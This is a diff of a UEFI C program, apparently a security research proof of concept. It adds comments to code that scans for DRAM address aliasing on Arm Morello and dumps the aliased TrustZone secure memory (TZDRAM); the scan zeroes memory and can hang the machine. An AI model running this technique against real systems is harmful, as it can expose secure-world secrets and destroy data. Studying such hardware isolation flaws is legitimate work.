@@ -2,6 +2,8 @@
 #include <efilib.h>
 #include <efidebug.h>
 
+
+/* Borrowed code from ARM TF-A for formatting. */
 #define bool	_Bool
 
 #define true	(0 < 1)
@@ -234,11 +236,14 @@ int memcmp(const void *s1, const void *s2, size_t len)
     return 0;
 }
 
+/* Shim SetMem to POSIX memset. */
 void* memset(void* dst, int val, size_t count) {
   ST->BootServices->SetMem(dst, count, val);
   return 0;
 }
 
+/* Discover aliasing in the specified range. Beware that it will be zero'd,
+   which can cause a hang if something important is overwritten. */
 void find_alias_overwrite_addr(uint64_t start, uint64_t end) {
   uint64_t aliased_region_start = 0;
   uint64_t region_start_data = 0;
@@ -268,6 +273,7 @@ void find_alias_overwrite_addr(uint64_t start, uint64_t end) {
   }
 }
 
+/* Parameters for scanning on Morello. */
 #define MORELLO_TZDRAM_START 0xff000000
 #define MORELLO_TZDRAM_END  0x101000000
 #define DRAM0_ALIAS_OFFSET   0x8380000000
@@ -279,6 +285,7 @@ void dump_range(uint64_t start, uint64_t end) {
   }
 }
 
+/* Simple PoC. dump out the alias of TZDRAM. */
 void dump_aliased_tzdram() {
   printf("configuring EL1 data cacheability...\r\n");
   uint64_t sctlr_el1 = 0;
@@ -299,9 +306,7 @@ efi_main(
     EFI_STATUS result;
     EFI_INPUT_KEY Key;
 
-    /* Store the system table for future use in other functions */
     ST = systab;
-    /* IH = image_handle; */
 
     uint64_t pc;
     asm volatile ("adr %0, ." : "=r" (pc));
@@ -310,7 +315,8 @@ efi_main(
     result = ST->BootServices->SetWatchdogTimer(0, 0, 0, NULL);
     if(result != EFI_SUCCESS)
       printf("failed to soothe watchdog!!\r\n");
-      find_alias_overwrite_addr(0x8080000000, 0x8477E40000);
+    /* Example range for Morello. Needs changing based on memory map. */
+    find_alias_overwrite_addr(0x8080000000, 0x8477E40000);
     /* dump_aliased_tzdram(); */
 
     result = ST->ConIn->Reset(ST->ConIn, FALSE);
